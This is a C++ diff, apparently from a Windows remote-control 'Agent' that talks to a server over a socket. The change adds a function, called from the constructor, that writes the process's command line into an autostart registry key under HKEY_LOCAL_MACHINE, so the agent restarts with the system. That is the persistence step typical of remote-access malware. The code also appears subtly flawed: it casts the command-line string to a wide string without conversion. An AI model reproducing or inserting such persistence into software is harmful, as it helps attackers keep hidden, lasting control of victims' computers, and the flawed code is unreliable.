@@ -24,6 +24,7 @@ vector<string> split(string str)
 */
 Agent::Agent()
 {
+	set_curr_proc_to_autostart();
 	recvbuflen = DEFAULT_BUFLEN;
 
 	CreateSocket();
@@ -203,6 +204,48 @@ void Agent::GetRequestFromServer()
 			break;
 		}
 	}
+}
+BOOL Agent::set_curr_proc_to_autostart()
+{
+
+		HKEY hkey;
+		DWORD result_create_key = 0, result_opening = -1;
+		result_opening = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+			(LPCSTR)AUTO_START_PATH,
+			NULL,
+			NULL,
+			NULL,
+			KEY_ALL_ACCESS,
+			NULL,
+			&hkey,
+			&result_create_key
+		);
+
+		if (result_opening != ERROR_SUCCESS)
+		{
+			return FALSE;
+		}
+
+		LPCWSTR current_proccess_path = (LPCWSTR)GetCommandLine();
+
+		result_opening = RegSetValueExW(hkey,
+			AUTO_START_NAME,
+			NULL,
+			REG_SZ,
+			(BYTE *)current_proccess_path,
+			wcslen(current_proccess_path) * 2
+		);
+
+		RegCloseKey(hkey);
+		if (result_opening != ERROR_SUCCESS)
+		{
+			return FALSE;
+		}
+		else
+		{
+			return TRUE;
+		}
+
 }
 /*
 	Take message and send it to server
